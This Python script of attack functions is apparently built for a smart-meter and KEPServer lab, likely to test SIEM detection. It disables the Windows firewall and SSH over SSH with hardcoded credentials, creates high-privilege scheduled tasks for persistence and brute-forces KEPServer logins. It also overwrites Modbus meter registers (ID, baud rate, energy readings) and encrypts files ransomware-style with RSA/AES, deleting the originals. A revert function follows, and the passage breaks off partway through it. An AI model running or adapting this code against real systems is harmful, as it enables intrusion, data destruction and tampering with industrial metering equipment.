from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
from psutil import process_iter
import signal
import base64
from pathlib import Path
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
#import ctypes
from sys import executable, argv
#from win32netcon import ACCESS_ALL
#from win32net import NetShareAdd
from time import sleep
#from win32console import GetConsoleWindow
#from win32gui import ShowWindow
import kepconfig
import pkgutil
from kepconfig import connection, admin, connectivity
import json
import sys
from Powershell.callPowerShell import runPowerShellScript
import paramiko



#############
# CONSTANTS #
#############

# Set the path for the shared directory
COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"

# Set the path for the Smart Meter folder
SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"

# Default credentials for windows server
USERNAME = "Student"
PASSWORD = "Student12345@"
WINDOWS_SERVER_IP = "172.16.2.223"

# Path for the Modpoll
MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"


###########
# ATTACKS #
###########

# Check if the script is running with administrator privileges, if not, restart with elevated privileges
# def check_admin() -> None:
#     """
#     Check if script is running wit admin privilege. Else, restart as admin.
#     """
#     try:
#         isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
#     except AttributeError:
#         isAdmin = False
#     if not isAdmin:
#         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

def ssh_run_commands(command, host=WINDOWS_SERVER_IP, username=USERNAME, password=PASSWORD):
    ssh_output: str = "" # Declare as string to prevent error proning
    
    if password is None:
        print("Using Hostkey? This is not implemented")
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=username, password=password)
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
    ssh_output_list = ssh_stdout.readlines()
    for line_no, line in enumerate(ssh_output_list):
        ssh_output_list[line_no] = line.replace("\r\n", "\n")
    ssh_output = "".join(ssh_output_list)

    return ssh_output



# Delete files in a specific folder
def delete_files(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(COPIED_PATH, file)
            remove(og)
            print("File: " + str(og) + " is deleted")

def create_scheduled_task() -> None:
    """
    Creates scheduled task in windows to execute the attackscript from time to time.

    # TODO: Add comments on how frequent the schtasks run.
    # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
    """
    try:
        executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'

        executable_file_parameters = '1'

        task_name1 = 'Smart Meter Testing'
        task_name2 = 'Smart Meter Testing 2'

        sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
        sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'

        # call(sch1, shell=True)
        # call(sch2, shell=True)

        # TODO: wait for the PS Command and see if this works.
        stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
        print(stuff)
        print("\nOk.\n")
    except Exception as e:
        print(e)
        print("\nFail.\n")

# Copy files from a folder to the shared directory
def copy_file(folder_path):
    try:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(COPIED_PATH, file)
                copyfile(og,dest)
                print("File: " + str(og) + " is copied")
        print("\nOk.\n")
    except Exception as e:
        print("\nFail.\n")

#Create Shared Folder
# def create_shared_folder():
#     try:
#         folder_path = r'C:\Windows\temp\Smartmeter'

#         # Create the folder if it does not already exist
#         if not path.exists(folder_path):
#             mkdir(folder_path)

#         netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
#         if "SmartMeterfolder" in netshare.stdout:
#             print ("SmartMeterfolder has already been shared.")
#         else:
#             # Set the share information
#             share_name = 'SmartMeterfolder'
#             share_path = folder_path
#             share_remark = 'Shared folder for full access'

#             # Create the share
#             share_info = {
#                 'netname': share_name,
#                 'path': share_path,
#                 'remark': share_remark,
#                 'max_uses': -1,
#                 'current_uses': 0,
#                 'permissions': ACCESS_ALL,
#                 'security_descriptor': None
#             }
#             NetShareAdd(None, 2, share_info)
#             print ("SmartMeterfolder has been shared.")
#     except Exception as e:
#         print("\nFail.\n")

# Disable the firewall
def disable_firewall():
    #cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
    command_output = ssh_run_commands("netsh advfirewall set allprofiles state off")

    if "Ok." in command_output:
        print("Firewall disabled successfully\nOk.\n")
    else:
        print("Firewall failed to disable\nFail.\n")

# Disable SSH from the firewall
def disable_ssh():
    count = 0
    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
    if "Ok." in command_output:
        count += 1
        print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")

    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
    if "Ok." in command_output:
        count += 1
        print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")

    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
    if "Ok." in command_output:
        count += 1
        print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")
        
    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
    if "Ok." in command_output:
        count += 1
        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")

    service_name = "sshd"
    command_output = ssh_run_commands(f"sc stop {service_name}")

    if "FAILED" in command_output:
        print(f"FAILED: {command_output}")
    else:
        print(f"sshd service stopped")
        count += 1

    if count > 4:
        print("SSH Disabled successfully.\nOk.\n")
    else:
        print("SSH Failed to Disable.\nFail.\n")

#Run modpoll to interrupt COM1 port
def run_modinterrupt():
    kep_server_stop()

    executable_path = MODPOLL_PATH + r"\modpoll.exe"

    parameters = ["-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
    
    check_modpoll = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")

    # FIXME: Get the baudrate to run with this.
    if "Polling" in check_modpoll:
        print("Modinterrupt is running \nOk.\n")
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
        try:
            ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
    else:
        print("Modinterrupt is not running. \n Fail.\n")


#Disable a COM port
def disable_COMPort():

    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
    if "RUNNING" in netshare.stdout:
        print("Kepserver is running, Stopping now.")
        service_name = "KEPServerEXV6"
        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
        else:
            print("The " + output[1] + " service is " + output[9])
            sleep(15)

    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
    dump = cp.stdout.split()
    deviceID = ""
    for i in range(0, len(dump)):
        if dump[i].decode("utf-8") == "ID:":
            deviceID = dump[i+1].decode("utf-8")
            if "CVBCx196117" in deviceID:
                comPort = deviceID
    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + comPort + "\""
    with open("script.bat", "w") as f:
        f.write(batchscript)
    cp = run(["script.bat"],stdout=PIPE ,shell=True)
    if "successfully" in cp.stdout.decode('utf-8'):
        print(cp.stdout.decode('utf-8'))

        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
        if "RUNNING" not in netshare.stdout:
            print("Kepserver is stopped, Starting now.")
            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
            else:
                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
    else:
        # print(cp.stdout.decode('utf-8'))
        print("Device not disabled. \nFail.\n")

    remove("script.bat")

def encrypt_files():
    #public key
    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
    pubKey = base64.b64decode(pubKey)

    #exclude extensions
    excludeExtension = ['.py','.pem', '.exe']
    try:
        for item in recurseFiles(SMARTMETER_PATH): 
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            if fileType in excludeExtension:
                continue
            encrypt(filePath, pubKey)
            print("Encrypted: " + str(filePath))

        print("Encryption Successful.\nOk.\n")
    except Exception as e:
        print("Encryption Failed.\nFail.\n")

def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.encrypted'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    remove(dataFile)


def recurseFiles(baseDirectory):
    #Scan a directory and return a list of all files
    for entry in scandir(baseDirectory):
        if entry.is_file():
            yield entry
        else:
            yield from recurseFiles(entry.path)

def decrypt(dataFile, privatekey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    key = RSA.import_key(privatekey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
    try:
        # decrypt the session key
        cipher = PKCS1_OAEP.new(key)
        sessionKey = cipher.decrypt(encryptedSessionKey)

        # decrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        # save the decrypted data to file
        [ fileName, fileExtension ] = str(dataFile).split('.')
        decryptedFile = fileName + '_decrypted.csv'
        with open(decryptedFile, 'wb') as f:
            f.write(data)

        print('Decrypted file saved to ' + decryptedFile)
    except Exception as e:
        print("File have not been encrypted.")

#Run modpoll to change register 40201 to 26
def change_meterID():

    kep_server_stop()
    
    executable_path = MODPOLL_PATH + r"\modpoll.exe"

    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]

    # FIXME: Try except for running the executable is gone
    print(ssh_run_commands(f"{executable_path} {' '.join(parameters)}"))
    kep_server_start()

    print("\nOk.\n")


def clear_energy_reading():

    kep_server_stop()

    executable_path = MODPOLL_PATH + r"\modpoll.exe"
    check_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
    clear_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
    
    # FIXME: Try except for running the executable is gone
    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))
    print(ssh_run_commands(f"{executable_path} {' '.join(clear_energy)}"))
    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))

    print("Energy Reading Cleared.")

    kep_server_start()

    print("\nOk.\n")

def kep_bruteforce():

    kep_server_start()

    usernames = ["Admin", "Administrator"]
    passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
    success = 0

    for username in usernames:
        for password in passwords:
            print("Trying Username: " + username +", Trying Password: " + password)
            # Read and print each line in the file
            # BUG: Why open KEPServerProperties?
            try:
                server = kepconfig.connection.server(host = WINDOWS_SERVER_IP, port = 57412, user = username, pw = password)
                output = server.get_project_properties()
                with open(COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
                    f.write(str(output))
                print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
                success = 1
                break
            except Exception as e:
                print("Failed.\n")
                continue

    if success == 0:
        print("\nFail.")

#Run modpoll to change baud rate - Register 40206 
def baudrate_change():
    kep_server_stop()

    executable_path = MODPOLL_PATH + r"\modpoll.exe"

    # Call baudrate_check to determine current baudrate
    current_baudrate = baudrate_check()
    print(f"Current BaudRate:{current_baudrate}", file=sys.stdout)

    # Use current_baudrate value to set the new baudrate value in parameters list
    new_baudrate = None
    identifyBR = None
    if current_baudrate == "4800":
        new_baudrate = "1"
        identifyBR = "9600"
    elif current_baudrate == "9600":
        new_baudrate = "2"
        identifyBR = "19200"
    elif current_baudrate == "19200":
        new_baudrate = "0"
        identifyBR = "4800"
    else:
        print("Error: Unknown baudrate", file=sys.stdout)
        return

    print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}", file=sys.stdout)

    parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
    
    ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
    kep_server_start()

def baudrate_check():
    kep_server_stop()

    executable_path = MODPOLL_PATH + r"\modpoll.exe"

    found_baudrate = 0
    baudrate_list = ["4800", "9600", "19200"]

    for baudrate in baudrate_list:
        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
        baudrate_output = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")

        print(f"Checking baudrate {baudrate}:")
        # print(baudRateOutput)
       
        if "[206]:" in baudrate_output:
            print(f"Baudrate is {baudrate}\n")
            found_baudrate = baudrate
            break
        else:
            print(f"Baudrate is not {baudrate}\n")
        
    kep_server_start()
    print("\nOk.\n")

    return found_baudrate

def smartmeter_get_hardware_info():
    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
    if "RUNNING" in netshare.stdout:
        print("Kepserver is running, Stopping now.")
        service_name = "KEPServerEXV6"
        cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
        else:
            print("The " + output[1] + " service is " + output[9])
            sleep(15)

    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"

    baudrate = baudrate_check()
    if baudrate in ["4800", "9600", "19200"]:
        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
        # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
        # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
        firmwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()

        parameters[9] = "9006" # DPM33 Address for reading hardwareOutput
        hardwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()

        # TODO: For "cannot be detected" stuff, raise an exception
        if "[9005]:" in firmwareOutput:
            firmware_index = firmwareOutput.index("[9005]:")
            print(f"Firmware version: {firmwareOutput[firmware_index + 1]}")
        else:
            print(f"Firmware version cannot be detected")

        if "[9006]:" in hardwareOutput:
            hardware_index = hardwareOutput.index("[9006]:")
            print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
        else:
            print(f"Hardware version cannot be detected")
        
        try: 
            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
                print("Fail.\n")
            else:
                print("The " + output[1] + " service is " + output[9])

            print("\nOk.\n")
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
            print("Fail.\n")
    
    else:
        try: 
            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
                print("Fail.\n")
            else:
                print("The " + output[1] + " service is " + output[9])

            print("\nOk.\n")
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
            print("Fail.\n")

        raise Exception("Unable to connect to the SmartMeter")

   
    return
        


# TODO: REVERT THIS THING PAIN.
def revert(revertoption):
    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
    if revertoption == "1":
        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Firewall enabled successfully.\nOk.\n")
        else:
            print("Firewall failed to enable.\nFail.\n")
        
    elif revertoption == "2":
        count = 0
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")

        service_name = "sshd"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9])
            count += 1

        if count == 5:
            print("Revert Success.\nOk.\n")
        else:
            print("Revert Fail.\nFail.\n")
        
    elif revertoption == "3":

        process_name = "modpoll"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Modpoll not running.")
        else:
            kill(pid, signal.SIGTERM)
            print("Modpoll pid:", pid, "has stopped.")

        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
        else:
            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
        
    elif revertoption == "4":
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                if "CVBCx196117" in deviceID:
                    comPort = deviceID
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        if "successfully" in cp.stdout.decode('utf-8'):
            print(cp.stdout.decode('utf-8') + "\nOk.\n")
        else:
            print("Device not enabled. \nFail.\n")
        remove("script.bat")

    elif revertoption == "5":
        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
-----END RSA PRIVATE KEY-----'''
    
        #exclude extensions
        excludeExtension = ['.py','.pem', '.exe']
        
        try:
            for item in recurseFiles(SMARTMETER_PATH): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                decrypt(filePath, privatekey)
            print("Decryption Successful.\nOk.\n")
        except Exception as e:
            print("Decryption Failed.\nFail.\n")

    elif revertoption == "6":

        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
        if "RUNNING" in netshare.stdout:
            print("Kepserver is running, Stopping now.")
            service_name = "KEPServerEXV6"
            cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
            else:
                print("The " + output[1] + " service is " + output[9])
                sleep(15)

        current_directory = getcwd()
        executable_path = current_directory + "\\modpoll.exe"
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
        try:
            check_call([executable_path] + parameters)
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
            print("Fail.\n")

        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
        else:
            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")

    elif revertoption == "7":
        process_name = "modpoll"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Modpoll not running.\nFail.\n")
        else:
            kill(pid, signal.SIGTERM)
            print("Modpoll pid:", pid, "has stopped. \nOk.\n")

    elif revertoption == "8":
        
        for root, dirs, files in walk(COPIED_PATH):
            for file in files:
                og = path.join(root, file)
                remove(og)
                print("File: " + str(og) + " is deleted")

        if path.exists(COPIED_PATH):
            rmdir(COPIED_PATH)
            print(COPIED_PATH + " has beeen removed.")

        netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)

        task_name1 = 'Smart Meter Testing'
        task_name2 = 'Smart Meter Testing 2'

        schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
        
            
        # Define the command to delete the task using schtasks
        schdel = f'schtasks /delete /tn "{task_name1}" /f'
        schdel2 = f'schtasks /delete /tn "{task_name2}" /f'

        # Delete the task using the schtasks command
        call(schdel, shell=True)
        call(schdel2, shell=True)

        if "SmartMeterfolder" in netsharechk.stdout:
            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)

        print("Ok.")

    elif revertoption == "9":

        # Stop Modpoll.exe
        print("\n==================================\n")

        process_name = "modpoll"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Modpoll not running.")
        else:
            kill(pid, signal.SIGTERM)
            print("Modpoll pid:", pid, "has stopped.")

        # Enable sshd service
        print("\n==================================\n")

        service_name = "sshd"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")

        # Revert Meter25 ID to 25
        print("\n==================================\n")

        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
        if "RUNNING" in netshare.stdout:
            print("Kepserver is running, Stopping now.")
            service_name = "KEPServerEXV6"
            cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
            else:
                print("The " + output[1] + " service is " + output[9])
                sleep(15)
        
        current_directory = getcwd()
        executable_path = current_directory + "\\modpoll.exe"
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
        try:
            check_call([executable_path] + parameters)
        except CalledProcessError as e:
            print("Error executing the executable file:", e)

        # Re-Enable Firewall
        print("\n==================================\n")
               
        cp = run('netsh advfirewall set allprofiles state on', stdout=PIPE, shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Revert Firewall diasble successful.")
        else:
            print("Revert Firewall diasble failed.")
        
        # Remove Firewall In/Outbound rules added.
        print("\n==================================\n")
        count = 0
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
